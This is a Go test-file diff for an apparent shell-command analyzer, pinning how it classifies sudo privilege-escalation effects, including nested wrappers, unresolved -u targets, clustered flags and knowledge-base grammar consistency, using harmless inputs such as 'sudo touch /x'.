+func TestBindSudoNestedWrapperResidual(t *testing.T) {
+	b := newBinder(t)
+	res := bindOne(t, b, "sudo -u nobody sudo touch /x")
+	hasEffectOn(t, res, engine.KindPrivEsc, engine.ModeDirect, "root")
+	if !strings.Contains(strings.Join(res.Notes, " "), "no privilege escalation") {
+		t.Errorf("expected the outer wrapper's de-elevation note, notes=%v", res.Notes)
+	}
+}
+
+// TestBindSudoRejectedTargetResidual pins the over-report of a rejected or
+// unresolved -u target on a command-bearing line: the certain ⊤-target
+// elevation is claimed beside the inner command, where the same value without
+// a command word reports that nothing runs (SECURITY.md Known Risks).
+func TestBindSudoRejectedTargetResidual(t *testing.T) {
+	b := newBinder(t)
+	for _, src := range []string{"sudo -u '' touch /x", "sudo -u '#abc' touch /x", "sudo -u -k touch /x"} {
+		res := bindOne(t, b, src)
+		e, ok := findEffect(res, engine.KindPrivEsc, engine.ModeDirect)
+		if !ok || !e.Target.IsTop() {
+			t.Fatalf("%s: expected PrivEsc/Direct over ⊤, got %s", src, effectsString(res))
+		}
+		if !strings.Contains(strings.Join(res.Notes, " "), "assuming a privileged target") {
+			t.Errorf("%s: expected the unresolved-direction note, notes=%v", src, res.Notes)
+		}
+	}
+}
+
+// TestBindSudoLiteralClusterResidual pins the literal-cluster precision gap:
+// `-iu`/`-su` are decomposed by parseArgs, leaving -u unsatisfied, so a
+// concrete target degrades to ⊤ rather than binding as written (over-report,
+// SECURITY.md Known Risks).
+func TestBindSudoLiteralClusterResidual(t *testing.T) {
+	b := newBinder(t)
+	for _, src := range []string{"sudo -iu root touch /x", "sudo -su root touch /x"} {
+		res := bindOne(t, b, src)
+		e, ok := findEffect(res, engine.KindPrivEsc, engine.ModeDirect)
+		if !ok || !e.Target.IsTop() {
+			t.Fatalf("%s: expected PrivEsc/Direct over ⊤, got %s", src, effectsString(res))
+		}
+	}
+}
+
+// TestBindNamelessWrapperElevation pins the nameless paths that never reach
+// the ordinary binding flow yet still must elevate: a privilege wrapper that
 // consumed the whole command line (sudo -i — no command word at all) and a
 // privilege wrapper over a dynamically-named inner command (sudo $X — the
 // name cannot be bound). The elevation knowledge lives in the binding layer,
@@ -942,5 +1669,52 @@ func TestBindSudoReportDiffersFromBareInput(t *testing.T) {
 	}
 	if bytes.Equal(aw, ab) {
 		t.Fatalf("sudo touch /opt/x must report differently than touch /opt/x")
+	}
+}
+
+// TestSudoGrammarLayers pins the three homes of sudo's CLI grammar against
+// each other: the knowledge base declares only options the frontend's
+// value-taking set knows how to pair (bash.SudoValueOpts), every
+// frontend-known sudo value option that is KB-declared has option kind, and
+// the binder's inert spellings stay undeclared (the counterpart direction is
+// pinned by kb.TestSudoInertSpellingsStayUndeclared). It also pins that sudo
+// is the only KB entry whose COMMAND positional is a Direct PrivEsc payload —
+// the refined -u doctrine and declaresWrapperPayload's ⊤ degradation key on
+// that uniqueness. A divergence would silently change elevation verdicts the
+// compiler cannot catch.
+func TestSudoGrammarLayers(t *testing.T) {
+	k, err := kb.Load()
+	if err != nil {
+		t.Fatalf("kb.Load: %v", err)
+	}
+	c, ok := k.Command("sudo")
+	if !ok {
+		t.Fatal("command sudo not found in the knowledge base")
+	}
+	for _, p := range c.Params {
+		if p.Kind == kb.ParamOption && !bash.SudoValueOpts(p.Spec) {
+			t.Errorf("sudo declares option %q, but front/bash.SudoValueOpts does not pair its absorbed value — the binder would re-parse it as a free-standing flag", p.Spec)
+		}
+		if p.Kind != kb.ParamOption && bash.SudoValueOpts(p.Spec) {
+			t.Errorf("sudo declares %q as kind %v, but front/bash.SudoValueOpts pairs the spelling as a value-taking option — parseArgs would match it as a valueless flag and the refined -u doctrine would silently degrade", p.Spec, p.Kind)
+		}
+	}
+	for _, spec := range []string{"-h", "--host", "-v", "-K", "-V", "--version", "--help", "-k", "-U", "--other-user"} {
+		if c.HasParam(spec) {
+			t.Errorf("sudo declares %q: the inert-line decision in bind.wrapperElevation keys on this spelling staying unrecognized", spec)
+		}
+	}
+	for i := range k.Commands {
+		cmd := &k.Commands[i]
+		if cmd.Name == "sudo" {
+			continue
+		}
+		for _, p := range cmd.Params {
+			if p.Kind == kb.ParamPositional && p.Spec == "COMMAND" &&
+				p.Effect.Kind == engine.KindPrivEsc && p.Effect.Mode == engine.ModeDirect {
+				t.Errorf("command %q declares a Direct PrivEsc COMMAND payload positional: the refined -u doctrine models sudo as the only such entry, and every call resolving onto another one would silently degrade to ⊤ (Conservative) — split the doctrine consciously before adding a second payload wrapper", cmd.Name)
+				break
+			}
+		}
 	}
 }
